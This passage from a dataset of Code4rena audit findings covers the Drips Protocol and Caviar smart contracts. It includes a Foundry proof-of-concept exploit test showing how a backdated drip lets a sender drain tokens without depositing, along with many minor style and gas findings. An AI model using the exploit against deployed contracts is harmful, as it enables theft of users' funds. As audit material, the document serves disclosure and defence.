DripsHistory[] memory history = hist(sender);\n>         skip(1);\n>         squeezeDrips(receiver, sender, history, 1);\n>         setDrips(sender, amt - 1, 0, recv(receiver, 1), 0);\n> \n>         // Squeeze again\n>         DripsHistory[] memory history2 = hist(history, sender);\n>         squeezeDrips(receiver, sender, history2, 0);\n>         \n>         skipToCycleEnd();\n>         receiveDrips(receiver, 0);\n>     }\n> \n>     function testSenderCannotChangeTheirMind() public {\n>         uint128 amt = cycleSecs;\n>         setDrips(sender, 0, amt, recv(receiver, 1), cycleSecs);\n>         DripsHistory[] memory history = hist(sender);\n>         skip(1);\n>         setDrips(sender, amt - 1, 0, recv(receiver, 1), 0);\n> \n>         // Squeeze First time\n>         DripsHistory[] memory history2 = hist(history, sender);\n>         squeezeDrips(receiver, sender, history2, 1);\n>         \n>         skipToCycleEnd();\n>         receiveDrips(receiver, 0);\n>     }\n> ```\n> \n> Ultimately we can see that what is owed to the recipient can never be taken back, however the sender can, through the grief shown in the above finding, prevent the tokens from being received until the end.\n> \n> **Conclusion**\n> \n> Given the information above, being mindful of:\n> - A potentially severe risk, with very low likelyhood\n> - The temporary breaking of the functionality of squeezing, which was meant to allow by-the-second claims.\n> \n> I agree with Medium Severity.\n> \n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the Drips.sol code related to squeezing drips from a sender. The vulnerability is that a sender can prevent a receiver from squeezing drips by front-running the squeeze transaction and adding a new configuration. This would update the current dripsHistoryHash and invalidate the historyHash provided by the receiver when squeezing, causing the squeeze to fail.\n\nThe vulnerable code is located at Drips.sol#L411 and Drips.sol#L461. At L411, the code checks if the last update was in the current cycle and sets the currCycleConfigs accordingly. At L461 the code checks if the historyHash provided by the receiver matches the finalHistoryHash, and if not, the squeeze fails.\n\nThe impact of this vulnerability is that a sender can prevent its drip receivers from squeezing.\n\nThe recommended mitigation steps are to consider allowing a receiver to squeeze drips from a sender up until the current timestamp.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/276",
      "tags": [],
      "finders": [
        "berndartmueller"
      ]
    },
    {
      "id": "6575",
      "title": "[H-01] Drips that end after the current cycle but before its creation can allow users to profit from squeezing",
      "impact": "HIGH",
      "content": "\nBy creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender doesn't have to put in any assets but the receiver can still squeeze this drip.\n\nBy setting a receiver that the sender controls, the sender can drain an arbitrary asset from the contract.\n\n### Proof of Concept\n\nLet the cycle length be 10 seconds. By i-th second I mean the i-th second of the cycle.\n\nAt the 5th second, sender creates a drip that starts at 0th second and lasts for 2 seconds.\n\nAt the 6th second, sender removes this drip.\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L569>\n\nSince the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance.\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L425-L430> \n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L490-L496>\n\nNow the receiver squeezes from this drip. \n\n`SqueezeStartCap = \\_currCycleStart() = 0th second, squeezeEndCap = 6th second`, so the receiver can still squeeze out the full amount even though the sender has withdrawn all of his balance.\n\nPlease add the following test to DripsHub.t.sol. It verifies that the sender has retrieved all of his assets but the receiver can still squeeze.\n\n        function customSetDrips(\n            uint256 forUser,\n            uint128 balanceFrom,\n            uint128 balanceTo,\n            DripsReceiver[] memory newReceivers\n        ) internal {\n            int128 balanceDelta = int128(balanceTo) - int128(balanceFrom);\n            DripsReceiver[] memory currReceivers = loadDrips(forUser);\n\n            vm.prank(driver);\n            int128 realBalanceDelta =\n                dripsHub.setDrips(forUser, erc20, currReceivers, balanceDelta, newReceivers, 0, 0);\n            \n            storeDrips(forUser, newReceivers);\n\n        }\n\n        function testExploitSqueeze() public {\n            skipToCycleEnd();\n            // Start dripping\n            DripsReceiver[] memory receivers = new DripsReceiver[](1);\n            receivers[0] = DripsReceiver(\n                receiver,\n                DripsConfigImpl.create(0, uint160(1 * dripsHub.AMT_PER_SEC_MULTIPLIER()), uint32(block.timestamp), 2)\n            );\n\n            DripsHistory[] memory history = new DripsHistory[](2);\n\n            uint256 balanceBefore = balance();\n            skip(5);\n            customSetDrips(user, 0, 2, receivers);\n            (,, uint32 lastUpdate,, uint32 maxEnd) = dripsHub.dripsState(user, erc20);\n            history[0] = DripsHistory(0, receivers, lastUpdate, maxEnd);\n\n            skip(1);\n            receivers = dripsReceivers();\n            customSetDrips(user, 2, 0, receivers);\n            (,, lastUpdate,, maxEnd) = dripsHub.dripsState(user, erc20);\n            history[1] = DripsHistory(0, receivers, lastUpdate, maxEnd);\n\n            assertBalance(balanceBefore);\n            \n            // Squeeze\n            vm.prank(driver);\n            uint128 amt = dripsHub.squeezeDrips(receiver, erc20, user, 0, history);\n            assertEq(amt, 2, \"Invalid squeezed amt\");\n        }\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2023-01-drips/blob/main/src/Drips.sol#L426>\n\nOne potential solution is to add an additional check after this line. Something along the lines of:\n\n`if (squeezeStartCap < drips.updateTime) squeezeStartCap = drips.updateTime;`\n\n**[CodeSandwich (Drips) confirmed and commented](https://github.com/code-423n4/2023-01-drips-findings/issues/315#issuecomment-1426376190):**\n> Great job! This is a critical protocol breaker.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-01-drips-findings/issues/315#issuecomment-1439673302):**\n > The Warden has shown a way to trick the contract into disbursing out funds without the upfront payment.\n> \n> Because this shows a way to steal the principal, I agree with High Severity.\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the Drips smart contract. It states that by creating a drip that ends after the current cycle but before its creation time and immediately removing it, the sender can avoid putting in any assets, but the receiver can still squeeze this drip. It provides a proof of concept to demonstrate the vulnerability, and recommends a mitigation step to fix it. \n\nThe vulnerability affects the Drips smart contract, and the impact is that the sender can drain arbitrary asset from the contract. This is done by setting a receiver that the sender controls. The proof of concept involves setting a cycle length of 10 seconds, and at the 5th second, the sender creates a drip that starts at 0th second and lasts for 2 seconds. At the 6th second, the sender removes this drip. Since the drip ends before it was created, the dripped amount is 0, so the sender can retrieve their full balance. The receiver can still squeeze out the full amount even though the sender has withdrawn all of their balance. \n\nThe tools used to identify the vulnerability were VSCode and Foundry. The suggested mitigation step is to add an additional check after a certain line in the Drips smart contract. This check would ensure that the squeezeStartCap is greater than the drips.updateTime. Additionally, a test was provided to verify that the sender has retrieved all of their assets, but the receiver can still squeeze.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Drips Protocol",
      "source_link": "https://code4rena.com/reports/2023-01-drips",
      "github_link": "https://github.com/code-423n4/2023-01-drips-findings/issues/315",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "evan"
      ]
    },
    {
      "id": "22942",
      "title": "[S-02] Generate perfect code headers every time",
      "impact": "LOW",
      "content": "\n**Description:**<br>\nI recommend using header for Solidity code layout and readability\n\nhttps://github.com/transmissions11/headers\n\n```js\n/*//////////////////////////////////////////////////////////////\n                           TESTING 123\n//////////////////////////////////////////////////////////////*/\n```\n\n**[outdoteth (Caviar) commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/203#issuecomment-1373927645):**\n > Great report\n\n**[berndartmueller commented](https://github.com/code-423n4/2022-12-caviar-findings/issues/203#issuecomment-1383991559):**\n > Great report by the warden!\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22941",
      "title": "[S-01] Project Upgrade and Stop Scenario should be",
      "impact": "LOW",
      "content": "\nAt the start of the project, the system may need to be stopped or upgraded, I suggest you have a script beforehand and add it to the documentation.<br>\nThis can also be called an \" EMERGENCY STOP (CIRCUIT BREAKER) PATTERN \".\n\nhttps://github.com/maxwoe/solidity_patterns/blob/master/security/EmergencyStop.sol\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22940",
      "title": "[N-13] Add to *blacklist function*",
      "impact": "LOW",
      "content": "\nNFT thefts have increased recently, so with the addition of hacked NFTs to the platform, NFTs can be converted into liquidity.\nTo prevent this, I recommend adding the blacklist function.\n\nMarketplaces such as Opensea have a blacklist feature that will not list NFTs that have been reported theft, NFT projects such as Manifold have blacklist functions in their smart contracts.\n\nHere is the project example; Manifold\n\nManifold Contract<br>\nhttps://etherscan.io/address/0xe4e4003afe3765aca8149a82fc064c0b125b9e5a#code\n\n```js\n     modifier nonBlacklistRequired(address extension) {\n         require(!_blacklistedExtensions.contains(extension), \"Extension blacklisted\");\n         _;\n     }\n```\n\n**Recommended Mitigation Steps:**<br>\nAdd to Blacklist function and modifier.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22939",
      "title": "[N-12] Missing Event for critical parameters init and change",
      "impact": "LOW",
      "content": "\n**Context:**\n```js\nsrc/Pair.sol:\n  38  \n  39:     constructor(\n  40:         address _nft,\n  41:         address _baseToken,\n  42:         bytes32 _merkleRoot,\n  43:         string memory pairSymbol,\n  44:         string memory nftName,\n  45:         string memory nftSymbol\n  46:     ) ERC20(string.concat(nftName, \" fractional token\"), string.concat(\"f\", nftSymbol), 18) {\n  47:         nft = _nft;\n  48:         baseToken = _baseToken; // use address(0) for native ETH\n  49:         merkleRoot = _merkleRoot;\n  50:         lpToken = new LpToken(pairSymbol);\n  51:         caviar = Caviar(msg.sender);\n  52:     }\n\nsrc/LpToken.sol:\n  11  contract LpToken is Owned, ERC20 {\n  12:     constructor(string memory pairSymbol)\n  13:         Owned(msg.sender)\n  14:         ERC20(string.concat(pairSymbol, \" LP token\"), string.concat(\"LP-\", pairSymbol), 18)\n  15:     {}\n\n\nsrc/Pair.sol:\n  38  \n  39:     constructor(\n  40:         address _nft,\n  41:         address _baseToken,\n  42:         bytes32 _merkleRoot,\n  43:         string memory pairSymbol,\n  44:         string memory nftName,\n  45:         string memory nftSymbol\n  46:     ) ERC20(string.concat(nftName, \" fractional token\"), string.concat(\"f\", nftSymbol), 18) {\n  47:         nft = _nft;\n  48:         baseToken = _baseToken; // use address(0) for native ETH\n  49:         merkleRoot = _merkleRoot;\n  50:         lpToken = new LpToken(pairSymbol);\n  51:         caviar = Caviar(msg.sender);\n  52:     }\n\n```\n\n**Description:**<br>\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes\n\n**Recommendation:**<br>\nAdd Event-Emit\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22938",
      "title": "[N-11] Showing the actual values of numbers in NatSpec comments makes checking and reading code easier",
      "impact": "LOW",
      "content": "\n```diff\nsrc/Pair.sol:\n  19  \n-  20:     uint256 public constant ONE = 1e18\n+  20:     uint256 public constant ONE = 1e18;  // 1_000_000_000_000_000_000\n-  21:     uint256 public constant CLOSE_GRACE_PERIOD = 7 days; \n+  21:     uint256 public constant CLOSE_GRACE_PERIOD = 7 days; // 604_800 ( 7 * 24 * 60 * 60)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22937",
      "title": "[N-10] Add EIP-2981 NFT Royalty Standart Support",
      "impact": "LOW",
      "content": "\nConsider adding EIP-2981 NFT Royalty Standard to the project\n\nhttps://eips.ethereum.org/EIPS/eip-2981\n\nRoyalty (Copyright  EIP 2981):\n\n* Fixed % royalties: For example, 6% of all sales go back to artists\n* Declining royalties: There may be a continuous decline in sales based on time or any other variable.\n* Dynamic royalties: Varies over time or sales amount\n* Upgradeable royalties: Allows a legal entity or NFT owner to change any copyright\n* Incremental royalties: No royalties, for example when sold for less than `$100`\n* Managed royalties: Funds are owned by a DAO, imagine the recipient is a DAO treasury\n* Royalties to different people: Collectors and artists can even use royalties, not specific to a particular personality\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22936",
      "title": "[N-09] Pragma version^0.8.17  version too recent to be trusted.",
      "impact": "LOW",
      "content": "\nhttps://github.com/ethereum/solidity/blob/develop/Changelog.md<br>\n0.8.17 (2022-09-08)<br>\n0.8.16 (2022-08-08)<br>\n0.8.15 (2022-06-15)<br>\n0.8.10 (2021-11-09)\n\nUnexpected bugs can be reported in recent versions;<br>\nRisks related to recent releases<br>\nRisks of complex code generation changes<br>\nRisks of new language features<br>\nRisks of known bugs\n\nUse a non-legacy and more battle-tested version<br>\nUse 0.8.10\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22935",
      "title": "[N-08] Use of `bytes.concat()` instead of `abi.encodePacked()`",
      "impact": "LOW",
      "content": "\n```solidity\n\n1 result - 1 file\n\nsrc/Pair.sol:\n  473          for (uint256 i = 0; i < tokenIds.length; i++) {\n  474:             bool isValid = MerkleProofLib.verify(proofs[i], merkleRoot, keccak256(abi.encodePacked(tokenIds[i])));\n\n```\nRather than using `abi.encodePacked` for appending bytes, since version 0.8.4, `bytes.concat()` is enabled.\n\nSince version 0.8.4 for appending bytes, `bytes.concat()` can be used instead of `abi.encodePacked(,)`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22934",
      "title": "[N-07] Use underscores for number literals",
      "impact": "LOW",
      "content": "\n```solidity\n2 results - 1 file\n\nsrc/Pair.sol:\n  399:         return (outputAmount * 1000 * baseTokenReserves()) / ((fractionalTokenReserves() - outputAmount) * 997);\n\n  413:         return (inputAmountWithFee * baseTokenReserves()) / ((fractionalTokenReserves() * 1000) + inputAmountWithFee);\n\n```\n**Description:**<br>\nThere are occasions where certain numbers have been hardcoded, either in variable or in the code itself. Large numbers can become hard to read.\n\n**Recommendation:**<br>\nConsider using underscores for number literals to improve its readability.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22933",
      "title": "[N-06] _Lock pragmas_ to specific compiler version",
      "impact": "LOW",
      "content": "\n**Description:**<br>\nPragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile locally.<br>\nhttps://swcregistry.io/docs/SWC-103\n\n**Recommendation:**<br>\nEthereum Smart Contract Best Practices - Lock pragmas to specific compiler version.<br>\n[solidity-specific/locking-pragmas](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/locking-pragmas/)\n\n```solidity\n5 results - 4 files\n\nsrc/Caviar.sol:\n  1  // SPDX-License-Identifier: MIT\n  2: pragma solidity ^0.8.17;\n  3  \n\nsrc/LpToken.sol:\n  1  // SPDX-License-Identifier: MIT\n  2: pragma solidity ^0.8.17;\n  3  \n\nsrc/Pair.sol:\n  1  // SPDX-License-Identifier: MIT\n  2: pragma solidity ^0.8.17;\n  3  \n\nsrc/lib/SafeERC20Namer.sol:\n  1  // SPDX-License-Identifier: MIT\n  2: pragma solidity ^0.8.17;\n\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22932",
      "title": "[N-05] For modern and more readable code; update import usages",
      "impact": "LOW",
      "content": "\n**Context:**\n\n```solidity\n\n13 results - 4 files\n\nsrc/Caviar.sol:\n  3  \n  4: import \"solmate/auth/Owned.sol\";\n  5  \n  6: import \"./lib/SafeERC20Namer.sol\";\n  7: import \"./Pair.sol\";\n  8  \n\nsrc/LpToken.sol:\n  3  \n  4: import \"solmate/auth/Owned.sol\";\n  5: import \"solmate/tokens/ERC20.sol\";\n  6  \n\nsrc/Pair.sol:\n   3  \n   4: import \"solmate/tokens/ERC20.sol\";\n   5: import \"solmate/tokens/ERC721.sol\";\n   6: import \"solmate/utils/MerkleProofLib.sol\";\n   7: import \"solmate/utils/SafeTransferLib.sol\";\n   8: import \"openzeppelin/utils/math/Math.sol\";\n   9  \n  10: import \"./LpToken.sol\";\n  11: import \"./Caviar.sol\";\n  12  \n\nsrc/lib/SafeERC20Namer.sol:\n  3  \n  4: import \"openzeppelin/utils/Strings.sol\";\n  5 \n\n```\n\n**Description:**<br>\nSolidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct `polluted the source code` with an unnecessary object we were not using because we did not need it. <br>\nThis was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.\n\n**Recommendation:**<br>\n`import {contract1 , contract2} from \"filename.sol\";`\n\nA good example from the ArtGobblers project;\n```js\nimport {Owned} from \"solmate/auth/Owned.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {LibString} from \"solmate/utils/LibString.sol\";\nimport {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\";\nimport {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\";\nimport {ERC1155, ERC1155TokenReceiver} from \"solmate/tokens/ERC1155.sol\";\nimport {toWadUnsafe, toDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\";\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22931",
      "title": "[N-04] Solidity compiler optimizations can be problematic",
      "impact": "LOW",
      "content": "\n```js\n\nfoundry.toml:\n  1: [profile.default]\n  2: src = \"src\"\n  3: out = \"out\"\n  4: libs = [\"lib\"]\n  5: solc = \"0.8.17\"\n  6: optimizer_runs = 3_000\n\n```\n\n**Description:**<br>\nProtocol has enabled optional compiler optimizations in Solidity.<br>\nThere have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. \n\nTherefore, it is unclear how well they are being tested and exercised.<br>\nHigh-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by Truffle and Remix persisted until late 2018. The fix for this bug was not reported in the Solidity CHANGELOG. \n\nAnother high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported.<br>\nA compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe.<br>\nIt is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations.\n\n**Exploit Scenario:**<br>\nA latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the contracts.\n\n**Recommendation:**<br>\nShort term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug.\nLong term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22930",
      "title": "[N-03] `Function writing` that does not comply with the `Solidity Style Guide`",
      "impact": "LOW",
      "content": "\n**Context:**<br>\nAll Contracts\n\n**Description:**<br>\nOrder of Functions; ordering helps readers identify which functions they can call and to find the constructor and fallback definitions easier. But there are contracts in the project that do not comply with this.\n\nhttps://docs.soliditylang.org/en/v0.8.17/style-guide.html\n\nFunctions should be grouped according to their visibility and ordered:\n\n* constructor\n* receive function (if exists)\n* fallback function (if exists)\n* external\n* public\n* internal\n* private\n* within a grouping, place the view and pure functions last\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22929",
      "title": "[N-02] NatSpec comments should be increased in contracts",
      "impact": "LOW",
      "content": "\n**Context:**<br>\nAll Contracts\n\n**Description:**<br>\nIt is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation.<br>\nIn complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.<br>\nhttps://docs.soliditylang.org/en/v0.8.15/natspec-format.html\n\n**Recommendation:**<br>\nNatSpec comments should be increased in contracts\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22928",
      "title": "[N-01] Insufficient coverage",
      "impact": "LOW",
      "content": "\n**Description:**<br>\nThe test coverage rate of the project is 97%. Testing all functions is best practice in terms of security criteria.\n\n```js\n\n| File                                     | % Lines          | % Statements      | % Branches     | % Funcs        |\n|------------------------------------------|------------------|-------------------|----------------|----------------|\n| src/Caviar.sol                           | 100.00% (11/11)  | 100.00% (15/15)   | 100.00% (4/4)  | 100.00% (2/2)  |\n| src/LpToken.sol                          | 100.00% (2/2)    | 100.00% (2/2)     | 100.00% (0/0)  | 100.00% (2/2)  |\n| src/Pair.sol                             | 100.00% (88/88)  | 100.00% (107/107) | 95.24% (40/42) | 86.36% (19/22) |\n| src/lib/SafeERC20Namer.sol               | 0.00% (0/38)     | 0.00% (0/53)      | 0.00% (0/12)   | 0.00% (0/7)    |\n\n```\nDue to its capacity, test coverage is expected to be 100%.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6120",
      "title": "[G-12] Using `unchecked` blocks to save gas",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnt possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block.\n\n### Proof Of Concept\n\n```solidity\n168: uint256 refundAmount = maxInputAmount - inputAmount;\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L168\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-12-using-unchecked-blocks-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6119",
      "title": "[G-11] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier or require such as onlyOwner/onlyX is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2), DUP1(3), ISZERO(3), PUSH2(3), JUMPI(10), PUSH1(3), DUP1(3), REVERT(0), JUMPDEST(1), POP(2) which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\n### Proof Of Concept\n\n```solidity\n19: function mint(address to, uint256 amount) public onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol#L19\n\n```solidity\n26: function burn(address from, uint256 amount) public onlyOwner {\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol#L26\n\n### Recommended Mitigation Steps\nFunctions guaranteed to revert when called by normal users can be marked payable.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-11-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "6118",
      "title": "[G-10] Setting the `constructor` to `payable`",
      "impact": "GAS",
      "content": "\nSaves ~13 gas per instance\n\n### Proof Of Concept\n\n```solidity\n21: constructor() Owned(msg.sender)\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L21\n\n```solidity\n11: constructor(string memory pairSymbol)\n        Owned(msg.sender)\n        ERC20(string.concat(pairSymbol, \" LP token\"), string.concat(\"LP-\", pairSymbol), 18)\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/LpToken.sol#L11\n\n```solidity\n39: constructor(\n        address _nft,\n        address _baseToken,\n        bytes32 _merkleRoot,\n        string memory pairSymbol,\n        string memory nftName,\n        string memory nftSymbol\n    ) ERC20(string.concat(nftName, \" fractional token\"), string.concat(\"f\", nftSymbol), 18)\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L39\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-10-setting-the-constructor-to-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "6117",
      "title": "[G-09] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\n### Proof Of Concept\n\n```solidity\n463: function _validateTokenIds\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L463\n\n```solidity\n76: function tokenSymbol\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L76\n\n```solidity\n87: function tokenName\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/lib\\SafeERC20Namer.sol#L87\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-09-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "6116",
      "title": "[G-08] Superfluous event fields",
      "impact": "GAS",
      "content": "\n`block.number` and `block.timestamp` are added to the event information by default, so adding them manually will waste additional gas.\n\n### Proof Of Concept\n\n```solidity\n36: event Close(uint256 closeTimestamp);\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Pair.sol#L36\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-08-superfluous-event-fields",
      "tags": [],
      "finders": []
    },
    {
      "id": "6115",
      "title": "[G-07] Using fixed bytes is cheaper than using `string`",
      "impact": "GAS",
      "content": "\nAs a rule of thumb, use `bytes` for arbitrary-length raw byte data and string for arbitrary-length `string` (UTF-8) data. If you can limit the length to a certain number of bytes, always use one of `bytes1` to `bytes32` because they are much cheaper.\n\n### Proof Of Concept\n\n```solidity\n33: string memory baseTokenSymbol = baseToken == address(0) ? \"ETH\" : baseToken.tokenSymbol();\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L33\n\n```solidity\n36: string memory pairSymbol = string.concat(nftSymbol, \":\", baseTokenSymbol);\n```\n\nhttps://github.com/code-423n4/2022-12-caviar/tree/main/src/Caviar.sol#L36\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2022-12-caviar",
      "github_link": "#g-07-using-fixed-bytes-is-cheaper-than-using-string",
      "tags": [],
      "finders": []
    },
    {
      "id": "6114",
      "title": "[G-06] Optimize names to save gas",
      "impact": "GAS",
